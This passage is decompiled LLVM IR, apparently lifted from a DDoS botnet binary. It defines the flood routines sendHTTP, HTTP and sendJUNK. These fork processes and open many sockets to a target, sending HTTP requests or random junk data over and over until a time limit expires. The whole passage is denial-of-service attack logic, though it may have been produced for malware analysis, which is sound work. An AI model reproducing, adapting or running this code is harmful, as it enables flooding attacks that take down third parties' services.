  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_13c6c, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg4 to i8*
  %stack_var_-1084 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 81036, i32* %stack_var_-4, align 4
  %v2_13c88 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_13c88, i32* @fp, align 4
  %v2_13cb8 = call i32 @__GI_time(i32* null)
  %v2_13cc4 = add i32 %v2_13cb8, %arg5
  %v0_13ccc = call i32 @rand()
  %v2_13cf4.neg = urem i32 %v0_13ccc, 49
  %v4_13d10 = mul nuw nsw i32 %v2_13cf4.neg, 4
  %v5_13d10 = add i32 %v4_13d10, ptrtoint ([377 x i8*]* @global_var_44cb8.319 to i32)
  %v6_13d10 = inttoptr i32 %v5_13d10 to i32*
  %v7_13d10 = load i32, i32* %v6_13d10, align 4
  %v0_13d18 = call i32 @rand()
  %v2_13d2c = srem i32 %v0_13d18, 3
  %v3_13d54 = mul nsw i32 %v2_13d2c, 4
  %v2_13d58 = ptrtoint i32* %stack_var_-24 to i32
  %v2_13d5c = add i32 %v2_13d58, -36
  %v2_13d60 = add i32 %v2_13d5c, %v3_13d54
  %v1_13d64 = inttoptr i32 %v2_13d60 to i32*
  %v2_13d64 = load i32, i32* %v1_13d64, align 4
  %v3_13d70 = call i32 @strlen(i8* %arg1)
  %v3_13d7c = call i32 @strlen(i8* %tmp)
  %v2_13d84 = add i32 %v3_13d70, %v3_13d7c
  %v4_13d88 = inttoptr i32 %v7_13d10 to i8*
  %v3_13d8c = call i32 @strlen(i8* %v4_13d88)
  %v2_13d94 = add i32 %v2_13d84, %v3_13d8c
  store i32 %v2_13d94, i32* @r4, align 4
  %v4_13d98 = inttoptr i32 %v2_13d64 to i8*
  %v3_13d9c = call i32 @strlen(i8* %v4_13d98)
  %v0_13da4 = load i32, i32* @r4, align 4
  %v2_13da4 = add i32 %v0_13da4, %v3_13d9c
  %v1_13da8 = add i32 %v2_13da4, 55
  %v8_13dc0 = icmp sgt i32 %v1_13da8, 1023
  br i1 %v8_13dc0, label %dec_label_pc_13ec0, label %dec_label_pc_13dc4

dec_label_pc_13dc4:                               ; preds = %entry
  %tmp14 = ptrtoint i8* %arg1 to i32
  store i32 %v1_13da8, i32* @r1, align 4
  %v2_13dd0 = ptrtoint i32* %stack_var_-1084 to i32
  store i32 %v2_13dd0, i32* @r0, align 4
  %v10_13df8 = call i32 @__GI_snprintf(i32 %v2_13dd0, i32 %v1_13da8, i32 ptrtoint ([64 x i8]* @global_var_384ac.617 to i32), i32 %tmp14, i32 %arg4, i32 %v7_13d10, i32 %v2_13d64)
  %v2_13e34 = trunc i32 %arg3 to i16
  %tmp46 = bitcast i32* %stack_var_-1084 to i8*
  %v5_13ebc53 = icmp sgt i32 %arg6, 0
  br i1 %v5_13ebc53, label %dec_label_pc_13e08, label %dec_label_pc_13ec0

dec_label_pc_13e08:                               ; preds = %dec_label_pc_13dc4, %dec_label_pc_13ea4
  %storemerge1054 = phi i32 [ %v1_13ea8, %dec_label_pc_13ea4 ], [ 0, %dec_label_pc_13dc4 ]
  %v0_13e08 = call i32 @fork()
  %v2_13e10 = icmp eq i32 %v0_13e08, 0
  br i1 %v2_13e10, label %dec_label_pc_13ea4, label %dec_label_pc_13e84

dec_label_pc_13e1c:                               ; preds = %dec_label_pc_13e84
  %v3_13e34 = call i32 @socket_connect(i32 %arg2, i16 %v2_13e34)
  %v2_13e44 = icmp eq i32 %v3_13e34, 0
  br i1 %v2_13e44, label %dec_label_pc_13e84, label %dec_label_pc_13e4c

dec_label_pc_13e4c:                               ; preds = %dec_label_pc_13e1c
  %v3_13e5c = call i32 @strlen(i8* %tmp46)
  %v3_13e78 = call i32 @write(i32 %v3_13e34, i32 %v2_13dd0, i32 %v3_13e5c)
  %v1_13e80 = call i32 @close(i32 %v3_13e34)
  br label %dec_label_pc_13e84

dec_label_pc_13e84:                               ; preds = %dec_label_pc_13e1c, %dec_label_pc_13e4c, %dec_label_pc_13e08
  %v2_13e88 = call i32 @__GI_time(i32* null)
  %v5_13e98 = icmp slt i32 %v2_13e88, %v2_13cc4
  br i1 %v5_13e98, label %dec_label_pc_13e1c, label %dec_label_pc_13e9c

dec_label_pc_13e9c:                               ; preds = %dec_label_pc_13e84
  %v1_13ea0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_13ea4

dec_label_pc_13ea4:                               ; preds = %dec_label_pc_13e08, %dec_label_pc_13e9c
  %v1_13ec813 = phi i32 [ 0, %dec_label_pc_13e08 ], [ %v1_13ea0, %dec_label_pc_13e9c ]
  %v1_13ea8 = add nuw nsw i32 %storemerge1054, 1
  %v5_13ebc = icmp slt i32 %v1_13ea8, %arg6
  br i1 %v5_13ebc, label %dec_label_pc_13e08, label %dec_label_pc_13ec0

dec_label_pc_13ec0:                               ; preds = %dec_label_pc_13dc4, %dec_label_pc_13ea4, %entry
  %v1_13ec8 = phi i32 [ %v3_13d9c, %entry ], [ %v10_13df8, %dec_label_pc_13dc4 ], [ %v1_13ec813, %dec_label_pc_13ea4 ]
  ret i32 %v1_13ec8

; uselistorder directives
  uselistorder i32 %v1_13ea8, { 1, 0 }
  uselistorder i32 %v2_13dd0, { 1, 0, 2 }
  uselistorder i32 %v1_13da8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__GI_snprintf, { 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 55, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_13ec0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13ea4, { 1, 0 }
  uselistorder label %dec_label_pc_13e84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13e08, { 1, 0 }
}

define i32 @HTTP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 81644, i32* %stack_var_-4, align 4
  %v2_13ee8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_13ee8, i32* @fp, align 4
  %v1_13f04 = call i32 @mfork(i32 %arg2)
  %v2_13f0c = icmp eq i32 %v1_13f04, 0
  br i1 %v2_13f0c, label %dec_label_pc_13f14, label %dec_label_pc_14118

dec_label_pc_13f14:                               ; preds = %entry
  %v8_13f1c = icmp sgt i32 %arg3, 5
  br i1 %v8_13f1c, label %dec_label_pc_13f30, label %dec_label_pc_13f20

dec_label_pc_13f20:                               ; preds = %dec_label_pc_13f14
  store i32 %arg2, i32* @r2, align 4
  %v3_13f2c = call i32 @Send(i32 %arg1, i32 ptrtoint ([64 x i8]* @global_var_384ec.619 to i32))
  br label %dec_label_pc_13f30

dec_label_pc_13f30:                               ; preds = %dec_label_pc_13f14, %dec_label_pc_13f20
  %v1_13f34 = add i32 %arg4, 8
  %v1_13f38 = inttoptr i32 %v1_13f34 to i32*
  %v2_13f38 = load i32, i32* %v1_13f38, align 4
  store i32 %v2_13f38, i32* @r4, align 4
  %v1_13f40 = add i32 %arg4, 24
  %v1_13f44 = inttoptr i32 %v1_13f40 to i32*
  %v2_13f44 = load i32, i32* %v1_13f44, align 4
  store i32 %v2_13f44, i32* @r0, align 4
  %v1_13f4c = call i32 @atol(i32 %v2_13f44)
  store i32 %arg2, i32* @r2, align 4
  %v3_13f68 = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_3852c.621 to i32))
  %v1_13f70 = add i32 %arg4, 4
  %v1_13f74 = inttoptr i32 %v1_13f70 to i32*
  %v2_13f74 = load i32, i32* %v1_13f74, align 4
  store i32 %v2_13f74, i32* @r0, align 4
  %v2_13f80 = call i32 @__GI_strchr(i32 %v2_13f74, i32 44)
  %v2_13f88 = icmp eq i32 %v2_13f80, 0
  br i1 %v2_13f88, label %dec_label_pc_14078, label %dec_label_pc_13f90

dec_label_pc_13f90:                               ; preds = %dec_label_pc_13f30
  %v2_13f98 = load i32, i32* %v1_13f74, align 4
  store i32 %v2_13f98, i32* @r0, align 4
  %v2_13fa4 = call i32 @__GI_strtok(i32 %v2_13f98, i32 ptrtoint (i32* @global_var_37bdc.466 to i32))
  %v2_1406c4 = icmp eq i32 %v2_13fa4, 0
  br i1 %v2_1406c4, label %dec_label_pc_14118, label %dec_label_pc_13fb4.lr.ph

dec_label_pc_13fb4.lr.ph:                         ; preds = %dec_label_pc_13f90
  %v1_13fe0 = add i32 %arg4, 12
  %v1_13fe4 = inttoptr i32 %v1_13fe0 to i32*
  %v1_13ff8 = add i32 %arg4, 16
  %v1_13ffc = inttoptr i32 %v1_13ff8 to i32*
  %v1_14004 = add i32 %arg4, 20
  %v1_14008 = inttoptr i32 %v1_14004 to i32*
  br label %dec_label_pc_13fb4

dec_label_pc_13fb4:                               ; preds = %dec_label_pc_13fb4.lr.ph, %dec_label_pc_14054
  %v0_13fb4 = call i32 @listFork()
  %v2_13fbc = icmp eq i32 %v0_13fb4, 0
  br i1 %v2_13fbc, label %dec_label_pc_13fc4, label %dec_label_pc_14054

dec_label_pc_13fc4:                               ; preds = %dec_label_pc_13fb4
  %v2_13fcc = load i32, i32* %v1_13f74, align 4
  store i32 %v2_13fcc, i32* @r5, align 4
  %v2_13fd8 = load i32, i32* %v1_13f38, align 4
  store i32 %v2_13fd8, i32* @r6, align 4
  %v2_13fe4 = load i32, i32* %v1_13fe4, align 4
  store i32 %v2_13fe4, i32* @r0, align 4
  %v1_13fec = call i32 @atol(i32 %v2_13fe4)
  store i32 %v1_13fec, i32* @r7, align 4
  %v2_13ffc = load i32, i32* %v1_13ffc, align 4
  store i32 %v2_13ffc, i32* @r8, align 4
  %v2_14008 = load i32, i32* %v1_14008, align 4
  store i32 %v2_14008, i32* @r0, align 4
  %v1_14010 = call i32 @atol(i32 %v2_14008)
  store i32 %v1_14010, i32* @r4, align 4
  %v2_14020 = load i32, i32* %v1_13f44, align 4
  store i32 %v2_14020, i32* @r0, align 4
  %v1_14028 = call i32 @atol(i32 %v2_14020)
  %v0_14030 = load i32, i32* @r4, align 4
  %v0_14038 = load i32, i32* @r5, align 4
  %v0_1403c = load i32, i32* @r6, align 4
  %v0_14040 = load i32, i32* @r7, align 4
  %v0_14044 = load i32, i32* @r8, align 4
  %v6_14048 = inttoptr i32 %v0_14038 to i8*
  %v7_14048 = call i32 @sendHTTP(i8* %v6_14048, i32 %v0_1403c, i32 %v0_14040, i32 %v0_14044, i32 %v0_14030, i32 %v1_14028)
  %v1_14050 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_14054

dec_label_pc_14054:                               ; preds = %dec_label_pc_13fb4, %dec_label_pc_13fc4
  store i32 0, i32* @r0, align 4
  %v2_1405c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_37bdc.466 to i32))
  %v2_1406c = icmp eq i32 %v2_1405c, 0
  br i1 %v2_1406c, label %dec_label_pc_14118, label %dec_label_pc_13fb4

dec_label_pc_14078:                               ; preds = %dec_label_pc_13f30
  %v0_14078 = call i32 @listFork()
  %v2_14080 = icmp eq i32 %v0_14078, 0
  br i1 %v2_14080, label %dec_label_pc_14088, label %dec_label_pc_14118

dec_label_pc_14088:                               ; preds = %dec_label_pc_14078
  %v2_14090 = load i32, i32* %v1_13f74, align 4
  store i32 %v2_14090, i32* @r5, align 4
  %v2_1409c = load i32, i32* %v1_13f38, align 4
  store i32 %v2_1409c, i32* @r6, align 4
  %v1_140a4 = add i32 %arg4, 12
  %v1_140a8 = inttoptr i32 %v1_140a4 to i32*
  %v2_140a8 = load i32, i32* %v1_140a8, align 4
  store i32 %v2_140a8, i32* @r0, align 4
  %v1_140b0 = call i32 @atol(i32 %v2_140a8)
  store i32 %v1_140b0, i32* @r7, align 4
  %v1_140bc = add i32 %arg4, 16
  %v1_140c0 = inttoptr i32 %v1_140bc to i32*
  %v2_140c0 = load i32, i32* %v1_140c0, align 4
  store i32 %v2_140c0, i32* @r8, align 4
  %v1_140c8 = add i32 %arg4, 20
  %v1_140cc = inttoptr i32 %v1_140c8 to i32*
  %v2_140cc = load i32, i32* %v1_140cc, align 4
  store i32 %v2_140cc, i32* @r0, align 4
  %v1_140d4 = call i32 @atol(i32 %v2_140cc)
  store i32 %v1_140d4, i32* @r4, align 4
  %v2_140e4 = load i32, i32* %v1_13f44, align 4
  store i32 %v2_140e4, i32* @r0, align 4
  %v1_140ec = call i32 @atol(i32 %v2_140e4)
  %v0_140f4 = load i32, i32* @r4, align 4
  %v0_140fc = load i32, i32* @r5, align 4
  %v0_14100 = load i32, i32* @r6, align 4
  %v0_14104 = load i32, i32* @r7, align 4
  %v0_14108 = load i32, i32* @r8, align 4
  %v6_1410c = inttoptr i32 %v0_140fc to i8*
  %v7_1410c = call i32 @sendHTTP(i8* %v6_1410c, i32 %v0_14100, i32 %v0_14104, i32 %v0_14108, i32 %v0_140f4, i32 %v1_140ec)
  %v1_14114 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_14118

dec_label_pc_14118:                               ; preds = %dec_label_pc_14054, %dec_label_pc_13f90, %dec_label_pc_14078, %entry, %dec_label_pc_14088
  %v1_14120 = phi i32 [ %v0_14078, %dec_label_pc_14078 ], [ %v1_13f04, %entry ], [ %v1_14114, %dec_label_pc_14088 ], [ 0, %dec_label_pc_13f90 ], [ 0, %dec_label_pc_14054 ]
  ret i32 %v1_14120

; uselistorder directives
  uselistorder i32* %v1_13f74, { 2, 0, 1, 3 }
  uselistorder i32* %v1_13f44, { 1, 0, 2 }
  uselistorder i32* %v1_13f38, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ()* @listFork, { 2, 1, 5, 4, 3, 0 }
  uselistorder i32 %arg4, { 4, 3, 5, 1, 0, 2, 6, 8, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_14118, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_14054, { 1, 0 }
  uselistorder label %dec_label_pc_13fb4, { 1, 0 }
  uselistorder label %dec_label_pc_13f30, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 82236, i32* %stack_var_-4, align 4
  %v2_14138 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_14138, i32* @fp, align 4
  %v0_14154 = call i32 @getdtablesize()
  store i32 %v0_14154, i32* %r2.global-to-local, align 4
  %tmp = icmp slt i32 %v0_14154, 0
  %v3_1415c = zext i1 %tmp to i32
  %v2_14160 = add i32 %v3_1415c, %v0_14154
  %v3_14164 = sdiv i32 %v2_14160, 2
  store i32 2, i32* %stack_var_-76, align 4
  %v3_1417c = urem i32 %arg2, 65536
  %v1_14184 = call i32 @__GI_htons(i32 %v3_1417c)
  %v3_141a0 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-72)
  %v2_141a8 = icmp eq i32 %v3_141a0, 0
  br i1 %v2_141a8, label %dec_label_pc_141b4, label %dec_label_pc_14640

dec_label_pc_141b4:                               ; preds = %entry
  %v2_141b8 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_141b8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 8, i32* @r2, align 4
  %v0_141c8 = call i32 @__GI_memset()
  %v3_141d0 = mul i32 %v3_14164, 8
  %v1_141d4 = or i32 %v3_141d0, 7
  %v1_141d8 = add i32 %v1_141d4, 7
  %v3_141dc = and i32 %v1_141d8, -8
  %v1_141e4 = load i32, i32* @sp, align 4
  %v2_141e4 = sub i32 %v1_141e4, %v3_141dc
  %v1_141f4 = add i32 %v2_141e4, 15
  %v3_141f8 = and i32 %v1_141f4, -8
  %v2_1421c = mul i32 %v3_14164, 5
  store i32 %v3_141f8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v2_1421c, i32* @r2, align 4
  %v0_1422c = call i32 @__GI_memset()
  %v1_14234 = call i32 @malloc(i32 1024)
  store i32 %v1_14234, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1424c = call i32 @__GI_memset()
  %v2_1425c = call i32 @__GI_time(i32* null)
  store i32 %v2_1425c, i32* %r2.global-to-local, align 4
  %v2_14268 = add i32 %v2_1425c, %arg3
  %v2_143a4 = ptrtoint i32* %stack_var_-204 to i32
  %v2_143fc = ptrtoint i32* %stack_var_-24 to i32
  %v2_14468 = ptrtoint i32* %stack_var_-212 to i32
  %v2_144ac = ptrtoint i32* %stack_var_-220 to i32
  %v2_144b0 = ptrtoint i32* %stack_var_-216 to i32
  %v2_14334 = ptrtoint i32* %stack_var_-76 to i32
  %v8_1462046 = icmp sgt i32 %v2_14160, 1
  %v2_14400 = add i32 %v2_143fc, -180
  br label %dec_label_pc_14628

dec_label_pc_14280:                               ; preds = %dec_label_pc_14618.preheader, %dec_label_pc_1460c
  %storemerge249 = phi i32 [ %v1_14610, %dec_label_pc_1460c ], [ 0, %dec_label_pc_14618.preheader ]
  store i32 %v3_141f8, i32* %r2.global-to-local, align 4
  %v3_1428c = mul i32 %storemerge249, 8
  %v2_14290 = add i32 %v3_1428c, %v3_141f8
  %v2_14294 = or i32 %v2_14290, 4
  %v1_14298 = inttoptr i32 %v2_14294 to i8*
  %v2_14298 = load i8, i8* %v1_14298, align 4
  %v6_142a4 = icmp eq i8 %v2_14298, 0
  %v7_142a4 = icmp eq i8 %v2_14298, 1
  br i1 %v7_142a4, label %dec_label_pc_143b8.lr.ph, label %dec_label_pc_142ac

dec_label_pc_142ac:                               ; preds = %dec_label_pc_14280
  %v7_142b0 = icmp eq i8 %v2_14298, 2
  br i1 %v7_142b0, label %dec_label_pc_14578, label %dec_label_pc_142b8

dec_label_pc_142b8:                               ; preds = %dec_label_pc_142ac
  br i1 %v6_142a4, label %dec_label_pc_142c8, label %dec_label_pc_1460c

dec_label_pc_142c8:                               ; preds = %dec_label_pc_142b8
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_142d8 = call i32 @socket(i32 2, i32 1, i32 0)
  %v5_142e4 = mul i32 %storemerge249, 8
  %v6_142e4 = add i32 %v5_142e4, %v3_141f8
  %v7_142e4 = inttoptr i32 %v6_142e4 to i32*
  store i32 %v3_142d8, i32* %v7_142e4, align 8
  store i32 %storemerge249, i32* %r2.global-to-local, align 4
  %v6_142f0 = inttoptr i32 %v2_14290 to i32*
  %v7_142f0 = load i32, i32* %v6_142f0, align 8
  store i32 %v7_142f0, i32* @r4, align 4
  store i32 %storemerge249, i32* %r2.global-to-local, align 4
  %v7_142fc = load i32, i32* %v6_142f0, align 8
  store i32 %v7_142fc, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_1430c = call i32 @fcntl(i32 %v7_142fc, i32 3, i32 0)
  %v1_14314 = or i32 %v3_1430c, 2048
  store i32 %v1_14314, i32* @r3, align 4
  %v0_14318 = load i32, i32* @r4, align 4
  store i32 %v1_14314, i32* %r2.global-to-local, align 4
  %v3_14324 = call i32 @fcntl(i32 %v0_14318, i32 4, i32 %v1_14314)
  store i32 %storemerge249, i32* %r2.global-to-local, align 4
  %v7_14330 = load i32, i32* %v6_142f0, align 8
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_14344 = call i32 @connect(i32 %v7_14330, i32 %v2_14334, i32 16)
  %v3_1434c = icmp eq i32 %v3_14344, -1
  br i1 %v3_1434c, label %dec_label_pc_14354, label %dec_label_pc_14368

dec_label_pc_14354:                               ; preds = %dec_label_pc_142c8
  %v0_14354 = call i32 @__errno_location()
  %v1_1435c = inttoptr i32 %v0_14354 to i32*
  %v2_1435c = load i32, i32* %v1_1435c, align 4
  %v7_14360 = icmp eq i32 %v2_1435c, 115
  br i1 %v7_14360, label %dec_label_pc_14380, label %dec_label_pc_14368

dec_label_pc_14368:                               ; preds = %dec_label_pc_142c8, %dec_label_pc_14354
  store i32 %v3_141f8, i32* %r2.global-to-local, align 4
  %v7_14370 = load i32, i32* %v6_142f0, align 8
  %v1_14378 = call i32 @close(i32 %v7_14370)
  br label %dec_label_pc_1460c

dec_label_pc_14380:                               ; preds = %dec_label_pc_14354
  store i32 %v2_14294, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v1_14298, align 4
  br label %dec_label_pc_1460c

dec_label_pc_143b8.lr.ph:                         ; preds = %dec_label_pc_14280
  br label %dec_label_pc_143b8

dec_label_pc_143b8:                               ; preds = %dec_label_pc_143b8.lr.ph, %dec_label_pc_143b8
  %storemerge37 = phi i32 [ 0, %dec_label_pc_143b8.lr.ph ], [ %v1_143cc, %dec_label_pc_143b8 ]
  store i32 %v2_143a4, i32* %r2.global-to-local, align 4
  %v5_143c4 = mul nuw nsw i32 %storemerge37, 4
  %v6_143c4 = add i32 %v5_143c4, %v2_143a4
  %v7_143c4 = inttoptr i32 %v6_143c4 to i32*
  store i32 0, i32* %v7_143c4, align 4
  %v1_143cc = add nuw nsw i32 %storemerge37, 1
  %tmp40 = icmp ult i32 %v1_143cc, 32
  br i1 %tmp40, label %dec_label_pc_143b8, label %dec_label_pc_143e0

dec_label_pc_143e0:                               ; preds = %dec_label_pc_143b8
  store i32 %storemerge249, i32* %r2.global-to-local, align 4
  %v6_143e8 = inttoptr i32 %v2_14290 to i32*
  %v7_143e8 = load i32, i32* %v6_143e8, align 8
  %v3_143ec = udiv i32 %v7_143e8, 32
  store i32 -180, i32* %r2.global-to-local, align 4
  %v3_143f8 = mul nuw nsw i32 %v3_143ec, 4
  %v2_14404 = add i32 %v2_14400, %v3_143f8
  %v1_14408 = inttoptr i32 %v2_14404 to i32*
  %v2_14408 = load i32, i32* %v1_14408, align 4
  store i32 %storemerge249, i32* %r2.global-to-local, align 4
  %v7_14414 = load i32, i32* %v6_143e8, align 8
  %v1_14418 = urem i32 %v7_14414, 32
  %v6_14420 = shl i32 1, %v1_14418
  %v2_14424 = or i32 %v6_14420, %v2_14408
  store i32 %v2_14424, i32* %v1_14408, align 4
  store i32 0, i32* %stack_var_-212, align 4
  store i32 %storemerge249, i32* %r2.global-to-local, align 4
  %v7_1445c = load i32, i32* %v6_143e8, align 8
  %v1_14460 = add i32 %v7_1445c, 1
  store i32 %v1_14460, i32* %r2.global-to-local, align 4
  %v1_1446c = load i32, i32* @sp, align 4
  %v2_1446c = inttoptr i32 %v1_1446c to i32*
  store i32 %v2_14468, i32* %v2_1446c, align 4
  %v0_14470 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_143a4, i32* %r2.global-to-local, align 4
  %v4_14480 = load i32, i32* %stack_var_-212, align 4
  %v5_14480 = call i32 @__libc_select(i32 %v0_14470, i32 0, i32 %v2_143a4, i32 0, i32 %v4_14480)
  %v7_14490 = icmp eq i32 %v5_14480, 1
  br i1 %v7_14490, label %dec_label_pc_14498, label %dec_label_pc_14534

dec_label_pc_14498:                               ; preds = %dec_label_pc_143e0
  store i32 4, i32* %stack_var_-216, align 4
  store i32 %storemerge249, i32* %r2.global-to-local, align 4
  %v7_144a8 = load i32, i32* %v6_143e8, align 8
  store i32 %v7_144a8, i32* %r2.global-to-local, align 4
  %v1_144b4 = load i32, i32* @sp, align 4
  %v2_144b4 = inttoptr i32 %v1_144b4 to i32*
  store i32 %v2_144b0, i32* %v2_144b4, align 4
  %v0_144b8 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_144c8 = load i32, i32* %stack_var_-216, align 4
  %v5_144c8 = call i32 @getsockopt(i32 %v0_144b8, i32 1, i32 4, i32 %v2_144ac, i32 %v4_144c8)
  %v3_144cc = load i32, i32* %stack_var_-220, align 4
  %v2_144d0 = icmp eq i32 %v3_144cc, 0
  br i1 %v2_144d0, label %dec_label_pc_14510, label %dec_label_pc_144d8

dec_label_pc_144d8:                               ; preds = %dec_label_pc_14498
  store i32 %storemerge249, i32* %r2.global-to-local, align 4
  %v7_144e0 = load i32, i32* %v6_143e8, align 8
  %v1_144e8 = call i32 @close(i32 %v7_144e0)
  store i32 %v2_14294, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_14298, align 4
  br label %dec_label_pc_1460c

dec_label_pc_14510:                               ; preds = %dec_label_pc_14498
  store i32 %v2_14294, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_14298, align 4
  br label %dec_label_pc_1460c

dec_label_pc_14534:                               ; preds = %dec_label_pc_143e0
  %v3_14538 = icmp eq i32 %v5_14480, -1
  br i1 %v3_14538, label %dec_label_pc_14540, label %dec_label_pc_1460c

dec_label_pc_14540:                               ; preds = %dec_label_pc_14534
  store i32 %storemerge249, i32* %r2.global-to-local, align 4
  %v7_14548 = load i32, i32* %v6_143e8, align 8
  %v1_14550 = call i32 @close(i32 %v7_14548)
  store i32 %v2_14294, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_14298, align 4
  br label %dec_label_pc_1460c

dec_label_pc_14578:                               ; preds = %dec_label_pc_142ac
  %v2_14580 = call i32 @realrand(i32 32, i32 1024)
  %v2_14594 = call i32 @makeRandomShit(i32 %v1_14234, i32 %v2_14580)
  store i32 %storemerge249, i32* %r2.global-to-local, align 4
  %v6_145a0 = inttoptr i32 %v2_14290 to i32*
  %v7_145a0 = load i32, i32* %v6_145a0, align 8
  store i32 %v2_14580, i32* %r2.global-to-local, align 4
  %v4_145b4 = call i32 @send(i32 %v7_145a0, i32 %v1_14234, i32 %v2_14580, i32 16384)
  %v3_145bc = icmp eq i32 %v4_145b4, -1
  br i1 %v3_145bc, label %dec_label_pc_145c4, label %dec_label_pc_1460c

dec_label_pc_145c4:                               ; preds = %dec_label_pc_14578
  %v0_145c4 = call i32 @__errno_location()
  %v1_145cc = inttoptr i32 %v0_145c4 to i32*
  %v2_145cc = load i32, i32* %v1_145cc, align 4
  %v7_145d0 = icmp eq i32 %v2_145cc, 11
  br i1 %v7_145d0, label %dec_label_pc_1460c, label %dec_label_pc_145d8

dec_label_pc_145d8:                               ; preds = %dec_label_pc_145c4
  store i32 %storemerge249, i32* %r2.global-to-local, align 4
  %v7_145e0 = load i32, i32* %v6_145a0, align 8
  %v1_145e8 = call i32 @close(i32 %v7_145e0)
  store i32 %v2_14294, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_14298, align 4
  br label %dec_label_pc_1460c

dec_label_pc_1460c:                               ; preds = %dec_label_pc_142b8, %dec_label_pc_14534, %dec_label_pc_14578, %dec_label_pc_145c4, %dec_label_pc_14540, %dec_label_pc_14510, %dec_label_pc_144d8, %dec_label_pc_14380, %dec_label_pc_14368, %dec_label_pc_145d8
  %v1_14610 = add nuw nsw i32 %storemerge249, 1
  store i32 %v1_14610, i32* %r2.global-to-local, align 4
  %v5_14624 = icmp slt i32 %v1_14610, %v3_14164
  br i1 %v5_14624, label %dec_label_pc_14280, label %dec_label_pc_14628

dec_label_pc_14628:                               ; preds = %dec_label_pc_14618.preheader, %dec_label_pc_1460c, %dec_label_pc_141b4
  %v2_1462c = call i32 @__GI_time(i32* null)
  store i32 %v2_1462c, i32* %r2.global-to-local, align 4
  %v5_1463c = icmp slt i32 %v2_1462c, %v2_14268
  br i1 %v5_1463c, label %dec_label_pc_14618.preheader, label %dec_label_pc_14640

dec_label_pc_14618.preheader:                     ; preds = %dec_label_pc_14628
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v8_1462046, label %dec_label_pc_14280, label %dec_label_pc_14628

dec_label_pc_14640:                               ; preds = %dec_label_pc_14628, %entry
  %v1_1464c = phi i32 [ %v3_141a0, %entry ], [ %v2_1462c, %dec_label_pc_14628 ]
  ret i32 %v1_1464c

; uselistorder directives
  uselistorder i32 %v1_14610, { 2, 1, 0 }
  uselistorder i32 %v2_14580, { 1, 0, 2 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i8* %v1_14298, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_14294, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_14290, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge249, { 1, 9, 8, 7, 6, 5, 4, 3, 2, 12, 11, 10, 0, 13 }
  uselistorder i32 %v2_143a4, { 3, 2, 0, 1 }
  uselistorder i32 %v3_141f8, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_14164, { 1, 2, 0 }
  uselistorder i32 %v0_14154, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 36, 33, 32, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 0 }
  uselistorder i32 (i32, i32)* @makeRandomShit, { 0, 2, 1 }
